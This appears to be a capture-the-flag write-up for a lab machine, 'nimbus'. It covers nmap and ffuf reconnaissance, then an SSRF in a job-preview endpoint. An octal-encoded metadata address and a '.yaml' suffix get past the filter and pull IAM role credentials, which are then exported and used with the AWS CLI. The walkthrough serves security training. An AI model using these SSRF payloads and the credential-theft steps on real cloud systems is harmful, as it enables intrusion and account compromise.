
``` bash
#!/bin/bash

ip=$1
current_dir=$(pwd)

if [ $# -ne 1 ]; then
    echo "Usage: $0 <ip>"
    exit 1
fi

sleep 2

nmap -p- -sS -Pn --min-rate 5000 "$ip" -oN "$current_dir"/all_ports.txt 2>/dev/null

echo -e "\e[32m[*] First script done\e[0m"

sleep 2

ports=$(grep "^[0-9]" "$current_dir"/all_ports.txt | cut -d "/" -f1 | paste -sd "," -)

sleep 1

echo -e "\e[32m[*] Open ports = '$ports'\e[0m"

sleep 1

nmap -p "$ports" -sCV -Pn --min-rate 5000 "$ip" -oN "$current_dir"/version_ports.txt 2>/dev/null

echo -e "\e[32m[*] Done\e[0m"
```

``` bash
❯ cat version_ports.txt
# Nmap 7.98 scan initiated Tue Jun 23 17:15:43 2026 as: /usr/lib/nmap/nmap --privileged -p 22,80 -sCV -Pn --min-rate 5000 -oN /home/joel/hacking/ctf/htb/hard/nimbus/recon/version_ports.txt 10.129.28.44
Nmap scan report for 10.129.28.44
Host is up (0.036s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 eb:ab:8f:be:99:02:0b:3e:c4:1c:83:b2:66:2f:17:13 (ECDSA)
|_  256 c1:69:ab:84:f3:88:8b:b3:8a:ae:e2:28:35:54:35:0b (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nimbus.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Jun 23 17:15:51 2026 -- 1 IP address (1 host up) scanned in 8.43 seconds
╭─ ~/hacking/ctf/htb/hard/nimbus/recon                                                                             ✔ ─╮
╰─                                                                                                                   ─╯
```

``` bash

❯ echo "10.129.42.21 nimbus.htb" | sudo tee -a /etc/hosts

10.129.42.21 nimbus.htb

```

``` bash

❯ ffuf -u "http://nimbus.htb/" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.nimbus.htb" -fs 178

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://nimbus.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.nimbus.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 178
________________________________________________

aws                     [Status: 403, Size: 305, Words: 28, Lines: 8, Duration: 43ms]
:: Progress: [13760/114442] :: Job [1/1] :: 1047 req/sec :: Duration: [0:00:14] :: Errors: 0 ::

```

``` bash

❯ echo "10.129.42.21 aws.nimbus.htb" | sudo tee -a /etc/hosts

10.129.42.21 aws.nimbus.htb

```

``` bash

❯ curl -i aws.nimbus.htb
HTTP/1.1 403 FORBIDDEN
Server: nginx/1.24.0 (Ubuntu)
Date: Fri, 10 Jul 2026 18:01:22 GMT
Content-Type: text/xml; charset=utf-8
Content-Length: 305
Connection: keep-alive

<ErrorResponse xmlns="https://sts.amazonaws.com/doc/2011-06-15/">
  <Error>
    <Type>Sender</Type>
    <Code>InvalidClientTokenId</Code>
    <Message>The security token included in the request is invalid.</Message>
  </Error>
  <RequestId>p7518495-adc4-1191-49n2-4m70d8sdf922</RequestId>
</ErrorResponse>%      
<img width="715" height="573" alt="imagen" src="https://github.com/user-attachments/assets/c0516e1e-abd9-42dc-ad43-cd06c7a3abe9" />

```


<img width="686" height="240" alt="imagen" src="https://github.com/user-attachments/assets/acbe770d-1f89-476f-8591-0fac25f49a5f" />

``` bash
❯ nc -lvnp 9090
listening on [any] 9090 ...
connect to [10.10.14.54] from (UNKNOWN) [10.129.42.21] 38714
GET /test.yaml HTTP/1.1
Host: 10.10.14.54:9090
User-Agent: python-requests/2.34.2
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

<img width="672" height="235" alt="imagen" src="https://github.com/user-attachments/assets/d7f05726-3a13-466d-910a-48fef0c9c931" />


<img width="685" height="200" alt="imagen" src="https://github.com/user-attachments/assets/91626051-00de-4ca9-9230-ba39edf7f962" />

<img width="680" height="239" alt="imagen" src="https://github.com/user-attachments/assets/8acf8dfe-1809-4b87-938b-2769ee1f7eb0" />

<img width="674" height="90" alt="imagen" src="https://github.com/user-attachments/assets/b7994679-563c-456b-8cfc-7f15fff96ddf" />


``` python

import requests

while True:

      url = "http://nimbus.htb"
      submit_job = "/jobs/preview"
      full_url = url + submit_job

      user_input=input("url: ")
      data = {
        "url": user_input
        }

      if user_input == "exit":
          break
      try:
          response = requests.post(full_url, data=data, timeout=10)
          response.raise_for_status()
          print("Response: \n", response.text)
      except requests.exceptions.HTTPError as errh:
             print(f"Error HTTP del servidor: {errh}")

```

``` bash

❯ python3 url.py
url: http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=a.yaml
Response:
 <!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Preview — Nimbus</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: ui-monospace, Menlo, monospace; background: #1a1a1a; color: #d0d0d0; line-height: 1.5; padding: 2rem; max-width: 720px; margin: 0 auto; }
h1 { font-size: 1.4rem; margin-bottom: 0.25rem; color: #e6db74; }
.tag { color: #8b949e; font-size: 0.875rem; margin-bottom: 2rem; }
nav { border-top: 1px solid #333; border-bottom: 1px solid #333; padding: 0.75rem 0; margin-bottom: 2rem; }
nav a { color: #66d9ef; text-decoration: none; margin-right: 2rem; }
.panel { border: 1px solid #333; padding: 1rem; margin-bottom: 1rem; }
.err { border-left: 3px solid #f92672; padding-left: 1rem; color: #f92672; }
.ok { border-left: 3px solid #a6e22e; padding-left: 1rem; color: #a6e22e; margin-bottom: 1rem; padding: 0.5rem 1rem; font-size: 0.875rem; }
.meta { color: #666; font-size: 0.75rem; margin-bottom: 0.75rem; }
pre { background: #0d0d0d; padding: 0.75rem; overflow-x: auto; max-height: 400px; font-size: 0.8rem; color: #c0c0c0; border: 1px solid #222; }
h3 { font-size: 0.95rem; color: #a6e22e; margin: 1rem 0 0.5rem; }
a { color: #66d9ef; }
</style>
</head>
<body>
<h1>Preview</h1>
<div class="tag"><a href="/jobs">← submit another</a></div>
<div class="panel">
<div class="meta">Fetched: <code>http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/?a=a.yaml</code> · HTTP 200</div>
<h3>Raw response</h3><pre>nimbus-web-role</pre>
<h3>Parsed</h3><pre>nimbus-web-role</pre>
</div>

</body>
</html>
url:

```

``` bash


❯ python3 url.py
url: http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?test=test.yaml
Response:
 <!DOCTYPE html>
<html lang="en">
<head><meta charset="UTF-8"><title>Preview — Nimbus</title>
<style>
* { box-sizing: border-box; margin: 0; padding: 0; }
body { font-family: ui-monospace, Menlo, monospace; background: #1a1a1a; color: #d0d0d0; line-height: 1.5; padding: 2rem; max-width: 720px; margin: 0 auto; }
h1 { font-size: 1.4rem; margin-bottom: 0.25rem; color: #e6db74; }
.tag { color: #8b949e; font-size: 0.875rem; margin-bottom: 2rem; }
nav { border-top: 1px solid #333; border-bottom: 1px solid #333; padding: 0.75rem 0; margin-bottom: 2rem; }
nav a { color: #66d9ef; text-decoration: none; margin-right: 2rem; }
.panel { border: 1px solid #333; padding: 1rem; margin-bottom: 1rem; }
.err { border-left: 3px solid #f92672; padding-left: 1rem; color: #f92672; }
.ok { border-left: 3px solid #a6e22e; padding-left: 1rem; color: #a6e22e; margin-bottom: 1rem; padding: 0.5rem 1rem; font-size: 0.875rem; }
.meta { color: #666; font-size: 0.75rem; margin-bottom: 0.75rem; }
pre { background: #0d0d0d; padding: 0.75rem; overflow-x: auto; max-height: 400px; font-size: 0.8rem; color: #c0c0c0; border: 1px solid #222; }
h3 { font-size: 0.95rem; color: #a6e22e; margin: 1rem 0 0.5rem; }
a { color: #66d9ef; }
</style>
</head>
<body>
<h1>Preview</h1>
<div class="tag"><a href="/jobs">← submit another</a></div>
<div class="panel">
<div class="meta">Fetched: <code>http://0251.0376.0251.0376/latest/meta-data/iam/security-credentials/nimbus-web-role?test=test.yaml</code> · HTTP 200</div>
<h3>Raw response</h3><pre>{
  &#34;Code&#34;: &#34;Success&#34;,
  &#34;LastUpdated&#34;: &#34;2026-07-10T21:38:56Z&#34;,
  &#34;Type&#34;: &#34;AWS-HMAC&#34;,
  &#34;AccessKeyId&#34;: &#34;ASIAQX4PG7L2K9M3N5R8&#34;,
  &#34;SecretAccessKey&#34;: &#34;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#34;,
  &#34;Token&#34;: &#34;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#34;,
  &#34;Expiration&#34;: &#34;2026-07-11T03:38:56Z&#34;
}</pre>
<h3>Parsed</h3><pre>{&#39;Code&#39;: &#39;Success&#39;, &#39;LastUpdated&#39;: &#39;2026-07-10T21:38:56Z&#39;, &#39;Type&#39;: &#39;AWS-HMAC&#39;, &#39;AccessKeyId&#39;: &#39;ASIAQX4PG7L2K9M3N5R8&#39;, &#39;SecretAccessKey&#39;: &#39;bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs&#39;, &#39;Token&#39;: &#39;IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM&#39;, &#39;Expiration&#39;: &#39;2026-07-11T03:38:56Z&#39;}</pre>
</div>

</body>
</html>
url:


```

``` bash
❯ export AWS_ACCESS_KEY_ID='ASIAQX4PG7L2K9M3N5R8'

❯ export AWS_SECRET_ACCESS_KEY='bXJ7K8mP/q2Hf+vN9wT4LcRe5Y1Aoz3DhU6gKjQs'

❯ export AWS_SESSION_TOKEN='IQoJb3JpZ2luX2VjEHQaCXVzLWVhc3QtMSJGMEQCIBhV9zPmK3wQjL4nT8vR2xY7AoFqUk5HsP6BeMcW1aDgAiAR4tNoXzKp8VnJqL7mC3xY9FhWdQ5GBPmRkX2vT8jY6yqsAQiK//////////8BEAEaDDAwMDAwMDAwMDAwMCIMNZ5tQ7vEX2pKlHfqKtoBQwK5HmBcN4gXjVrUe1Pk9YsZ7DqWfThN3bMRoLYyJsKn8GpVxAcQ5VeWk2HiqXbF6CnXmM4PdYpL3rJzKqGtNvBfHcWyXa8jPzTn5LRMkV1QbWdAyKpGfHzNvU8TmEcL2qPdRhJsKgGn3VyXmFbBcNJ7QrHe5VpDxKfM'

❯ export AWS_DEFAULT_REGION='us-east-1'

❯ export AWS_ENDPOINT_URL="http://aws.nimbus.htb"

```

``` bash
❯ aws sts get-caller-identity --endpoint-url $AWS_ENDPOINT_URL
╭─ ~/hacking/ctf/htb/hard/nimbus/scripts                                                                     ✔ │ 13s ─╮
╰─                                                                                                                   ─╯
```

``` json 

{
    "UserId": "AROAQX4PG7L2K9M3N5R8H:i-0a1b2c3d4e5f6789a",
    "Account": "847219365028",
    "Arn": "arn:aws:sts::847219365028:assumed-role/nimbus-web-role/i-0a1b2c3d4e5f6789a"
}
